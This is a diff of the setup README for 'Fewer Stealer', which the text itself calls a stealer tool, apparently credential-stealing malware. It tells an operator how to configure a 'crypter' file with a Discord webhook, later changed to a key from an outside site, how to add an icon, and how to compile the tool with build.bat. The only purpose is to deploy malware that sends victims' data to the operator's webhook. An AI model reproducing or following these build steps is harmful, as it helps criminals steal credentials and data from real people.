@@ -1,6 +1,5 @@
 # Fewer Stealer Project
 
-
 ## Getting Started
 
 Follow these steps to set up the Fewer Stealer tool:
@@ -9,11 +8,8 @@ Follow these steps to set up the Fewer Stealer tool:
 
 1. Navigate to the "first crypter" folder.
 2. Open the "sa.js" file.
-3. Locate the line: `const webhook3939 = "YOUR_DISCORD_WEBHOOK_PUT_HERE";`
-4. Replace `"YOUR_DISCORD_WEBHOOK_PUT_HERE"` with your actual Discord webhook URL.
-5. Check 1421. (`soon injection if you have injection code put you here link`)
-
-
+3. Find the line: `const key = 'Please enter the key you generated from https://buildandwatch.net/createkey';`
+4. Replace `'Please enter the key you generated from https://buildandwatch.net/createkey'` with your actual key.
 
 ### Step 2: Adding an ICO File
 
@@ -24,4 +20,3 @@ Follow these steps to set up the Fewer Stealer tool:
 
 1. Return to the "Fewer Stealer Github v3" folder.
 2. Run the "build.bat" file to initiate the compilation process.
-
